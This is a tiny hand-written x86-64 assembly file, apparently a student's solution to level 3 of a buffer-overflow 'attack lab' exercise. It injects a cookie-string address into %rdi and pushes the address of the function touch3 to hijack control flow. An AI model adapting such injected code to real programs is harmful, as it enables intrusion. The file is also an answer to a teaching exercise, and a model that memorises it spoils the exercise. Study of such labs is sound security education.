# Hand-generated assembly code of the level 3 of part 1.

mov $0x5561dca8, %rdi	# Inject my cookie string on the top of the stack of "test". Then move it to the first argument: %rdi.
pushq $0x4018fa			# Push the address of touch3 to the top of the current stack. 
retq
